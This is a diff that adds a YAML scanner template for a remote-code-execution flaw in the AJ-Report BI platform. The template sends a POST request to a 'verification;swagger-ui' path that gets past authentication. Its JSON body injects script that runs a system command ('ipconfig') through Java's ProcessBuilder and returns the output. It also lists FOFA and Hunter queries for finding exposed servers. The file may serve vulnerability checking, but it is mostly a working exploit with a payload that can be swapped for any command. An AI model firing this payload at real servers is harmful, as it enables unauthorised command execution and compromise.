@@ -1,0 +1,17 @@
+name: AJ-Report-rce       
+rules: 
+  - method: POST   
+    path: "/dataSetParam/verification;swagger-ui/"
+    headers: 
+        Content-Type: "application/json;charset=UTF-8"
+    body: \"{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"ipconfig\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}\"     
+    expression:                        
+      status_code: 200               
+      response_header:              
+      response_body: "适配器"
+
+detail:                          
+  description: "AJ-Report是一个完全开源的BI平台,酷炫大屏展示,能随时随地掌控业务动态"
+  search:             
+    fofa: title="AJ-Report"
+    鹰图: web.title="AJ-Report"
